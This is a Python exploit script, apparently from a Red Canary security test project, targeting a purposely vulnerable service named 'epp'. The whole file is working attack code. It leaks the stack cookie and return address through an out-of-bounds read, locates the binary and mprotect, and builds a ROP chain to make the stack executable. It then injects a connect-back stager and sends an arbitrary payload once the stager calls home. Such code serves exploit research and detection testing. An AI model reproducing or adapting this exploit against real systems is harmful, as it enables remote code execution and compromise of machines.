#!/usr/bin/env python3
'''
The MIT License

Copyright (c) 2020 Red Canary, Inc.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

'''
import os
import sys
import array
import socket
import signal
import logging
from time import sleep
from ctypes import *
from struct import pack
from pwnlib.asm import asm
from pwnlib.elf import ELF
from pwnlib.rop.rop import ROP
from pwnlib.dynelf import DynELF
from pwnlib.context import context
from pwnlib.util.packing import flat
from pwnlib.tubes.listen import listen
from pwnlib.shellcraft.amd64 import trap, infloop, connectstager

logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)

__script_directory__ = os.path.realpath(os.path.dirname(__file__))

epp_path = os.path.join(__script_directory__, "../build/_X86_64/epp")

RT_AR = 1
RT_AW = 2
RT_STACK_OOB = 3

CALLBACK_PORT = 12345

def create_request(count=0):
    class ArbitraryRW(Structure):
        _pack_ = 1
        _fields_ = [
            ('address', c_uint64),
            ('size', c_uint64),
            ('data', c_uint8*count)
        ]

    class OutOfBounds(Structure):
        _pack_ = 1
        _fields_ = [
            ('read', c_uint8),
            ('overflow', c_uint8),
            ('size', c_uint64),
            ('data', c_uint8*count)
        ]

    class RequestUnion(Union):
        _fields_ = [("a_read", ArbitraryRW),
                    ("a_write", ArbitraryRW),
                    ("oob", OutOfBounds)]

    class Request(Structure):
        _pack_ = 1
        _fields_ = [
            ('cb', c_uint64),
            ('type', c_uint32),
            ('u', RequestUnion)
        ]

    return Request()


def create_stack_frame(shellcode=None):
    field_list = [
        ('marker', c_char * 16),
        ('result_code', c_uint64),
        ('stack_cookie', c_uint64),
        ('previous_frame_stack_base_pointer', c_uint64),
    ]

    if shellcode is not None:
        field_list.append(('shellcode', c_uint8 * len(shellcode)))
    else:
        field_list.append(('return_address', c_uint64))

    class StackOutOfBoundsFrame(Structure):
        _pack_ = 1
        _fields_ = field_list

    return StackOutOfBoundsFrame()


def a_read(s, address, size, into=None):
    arbitrary_read = create_request()
    arbitrary_read.cb = sizeof(arbitrary_read)
    arbitrary_read.type = RT_AR
    arbitrary_read.u.a_read.address = address
    arbitrary_read.u.a_read.size = size
    s.send(arbitrary_read)
    if into is not None:
        s.recv_into(into)
    else:
        return s.recv(size)


if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))

    listener = listen(CALLBACK_PORT)

    def signal_handler(sig, frame):
        s.shutdown(socket.SHUT_RDWR)
        s.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    stack_read_request = create_request()
    stack_read_request.cb = sizeof(stack_read_request)
    stack_read_request.type = RT_STACK_OOB
    stack_read_request.u.oob.read = 1
    stack_read_request.u.oob.overflow = 1
    stack_read_request.u.oob.size = sizeof(create_stack_frame())

    s.send(stack_read_request)

    stack_frame = create_stack_frame()
    s.recv_into(stack_frame)

    logging.info("stack cookie: 0x{:X}\nprevious_frame_stack_base_pointer: 0x{:X}\nreturn_address: 0x{:X}".format(
                 stack_frame.stack_cookie, stack_frame.previous_frame_stack_base_pointer, stack_frame.return_address))

    # With a return address into the binary, we can walk backwards along page boundaries,
    # and find the start of the binary with our arbitrary read exploit
    epp_ba = stack_frame.return_address & ~0xFFF

    while 1:
        page_prefix = a_read(s, epp_ba, 4)

        if page_prefix == bytes('\x7fELF', 'utf8'):
            logging.info(
                "epp base address: 0x{:X}".format(epp_ba))
            break

        epp_ba -= 0x1000

    def leak(address):
        return a_read(s, address, 8)

    epp_dyn_elf = DynELF(leak, epp_ba)
    libc_mprotect = epp_dyn_elf.lookup('mprotect', 'libc')

    context.clear(arch='amd64')
    binary = ELF(epp_path)
    binary.address = epp_ba
    binary.symbols = {'mprotect': libc_mprotect}
    rop = ROP(binary)
    # Mark the current stack page, and the one just before, incase we are on a boundary.
    rop.call(
        'mprotect', (stack_frame.previous_frame_stack_base_pointer & ~0xFFF, 0x2000, 0x7))

    target_ip = socket.gethostbyname(socket.gethostname())

    mprotect_rop = rop.chain()

    logging.info(rop.dump())
    # We are gonna be a little lazy and just end with an infinite loop,
    # we make no attempt to clean up the stack and continue normal
    # execution.
    connect_stager = asm(connectstager(target_ip, CALLBACK_PORT) + infloop())

    previous_frame_size = 0x30

    shell_code_stack_address = stack_frame.previous_frame_stack_base_pointer + \
        len(mprotect_rop) - \
        previous_frame_size

    shell_code = mprotect_rop + \
        pack("<Q", shell_code_stack_address) + \
        connect_stager

    logging.info("shellcode stack address: 0x{:X}".format(
        shell_code_stack_address))

    stack_stomp = create_stack_frame(shell_code)
    stack_stomp.marker = "rop__rop__rop!\x00".encode('utf8')
    stack_stomp.result_code = -1
    stack_stomp.stack_cookie = stack_frame.stack_cookie
    stack_stomp.previous_frame_stack_base_pointer = stack_frame.previous_frame_stack_base_pointer
    stack_stomp.shellcode = (c_ubyte * len(shell_code)
                             ).from_buffer_copy(shell_code)

    stack_stomp_request = create_request(sizeof(stack_stomp))
    stack_stomp_request.cb = sizeof(stack_stomp_request)
    stack_stomp_request.type = RT_STACK_OOB
    stack_stomp_request.u.oob.read = 0
    stack_stomp_request.u.oob.overflow = 1
    stack_stomp_request.u.oob.size = sizeof(stack_stomp)
    stack_stomp_request.u.oob.data = (
        c_ubyte * sizeof(stack_stomp)).from_buffer_copy(stack_stomp)

    s.send(stack_stomp_request)

    logging.info("Waiting for stager")

    listener.wait_for_connection()
    logging.info("Stager connected")
    input("Press Enter to send your payload!")
    payload = open(sys.argv[3], 'rb').read()
    listener.send(pack("<L", len(payload)))
    listener.send(payload)
    listener.close()
